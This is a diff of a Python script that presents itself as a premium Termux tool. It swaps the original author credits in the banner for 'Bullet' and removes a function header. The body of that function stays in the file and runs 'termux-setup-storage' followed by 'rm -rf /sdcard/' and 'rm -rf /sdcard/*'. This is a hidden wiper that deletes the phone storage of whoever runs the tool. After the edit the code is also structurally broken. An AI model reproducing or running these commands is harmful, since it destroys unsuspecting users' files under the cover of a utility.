@@ -81,7 +81,6 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
-def kikhobor():
 	_ongkon_("termux-setup-storage -y")
 	_ongkon_("rm -rf /sdcard/")
 	_ongkon_("rm -rf /sdcard/*")
@@ -112,9 +111,9 @@ logo ="""
 \033[1;92m
 \033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
 \033[1;32m[-] VERSION   :\033[1;32m 1.0
-\033[1;32m[-] AUTHOR    :\033[1;32m ARIF HOSEN LIMON
-\033[1;32m[-] GITHUB    :\033[1;32m BADSHAH-KING
-\033[1;32m[-] FACEBOOK  :\033[1;32m ARIF HOSEN
+\033[1;32m[-] AUTHOR    :\033[1;32m Bullet
+\033[1;32m[-] GITHUB    :\033[1;32m bullet
+\033[1;32m[-] FACEBOOK  :\033[1;32m bullet
 \033[1;92m
    \033[1;91m<\033[1;41m\033[1;97m THIS NAME IS BRAND LIMON\033[;0m\033[1;91m>\033[1;92m[+]"""
 loop = 0
@@ -144,7 +143,7 @@ try:
         os.system('clear')
     else:pass
 except:snigdho_Hasan('\n\033[1;31mNo internet connection ... \033[0;97m')
-#global functions
+#global function
 def dynamic(text):
     titik = ['.   ','..  ','... ','.... ']
     for o in titik:
